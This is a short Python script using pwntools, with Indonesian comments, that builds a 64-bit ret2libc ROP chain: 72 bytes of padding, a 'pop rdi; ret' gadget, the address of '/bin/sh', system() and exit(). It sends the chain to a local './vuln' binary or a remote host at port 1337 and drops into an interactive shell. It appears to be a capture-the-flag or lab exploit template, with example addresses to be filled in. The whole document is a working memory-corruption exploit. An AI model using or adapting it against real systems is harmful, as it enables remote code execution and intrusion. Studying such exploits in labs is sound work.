from pwn import *

# === CONFIGURATION ===
context.arch = 'amd64' # Set arsitektur ke 64-bit
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Alamat & Gadget ---
# Cari alamat ini pakai: ROPgadget --binary vuln | grep "pop rdi"
pop_rdi = 0x400733          # CONTOH: Alamat gadget 'pop rdi; ret'
addr_system = 0x7ffff7a33440 # CONTOH: Alamat system() di libc
addr_binsh = 0x7ffff7b97d57  # CONTOH: Alamat "/bin/sh" di libc
addr_exit = 0x7ffff7a25030   # CONTOH: Alamat exit()

# --- LANGKAH 2: Susun Payload ROP Chain ---
# Struktur 64-bit: [Padding] + [Pop RDI Gadget] + [Argumen] + [Fungsi]
offset = 72 # Sesuaikan hasil cyclic/GDB
padding = b'A' * offset

payload = padding
payload += p64(pop_rdi)    # 1. Lompat ke gadget pop rdi
payload += p64(addr_binsh) # 2. Alamat ini akan masuk ke register RDI
payload += p64(addr_system) # 3. Panggil system()
payload += p64(addr_exit)   # 4. Agar keluar dengan rapi

# --- LANGKAH 3: Eksekusi ---
log.info("Mengirim ROP Chain 64-bit...")
p.sendline(payload)
p.interactive()